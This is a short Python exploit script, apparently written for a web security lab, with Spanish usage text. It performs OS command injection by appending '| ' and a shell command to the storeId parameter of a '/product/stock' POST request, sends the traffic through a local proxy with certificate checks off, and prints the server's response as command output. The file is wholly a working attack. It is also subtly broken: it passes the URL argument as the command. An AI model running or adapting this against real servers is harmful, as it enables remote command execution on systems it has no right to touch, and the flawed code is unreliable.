import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}

def run_command(url,command):
    stock_path = '/product/stock'
    command_injection = '| ' + command
    params = {'productId': '1', 'storeId': command_injection}
    r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
    if (len(r.text)>3):
        print(f"[+] Command injection succesful!")
        print(f"[+] Output of command: {r.text}")
    else:
        print("[-] Command injection Failed!")

def main():
    if len(sys.argv) != 3:
        print(f"[+] Uso: {sys.argv[0]} <url> <command>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.example.com whoami")
        return
    
    url = sys.argv[1]
    command = sys.argv[1]
    print("[+] Exploiting command injection...")
    run_command(url,command)
    


if __name__== "__main__":
    main()




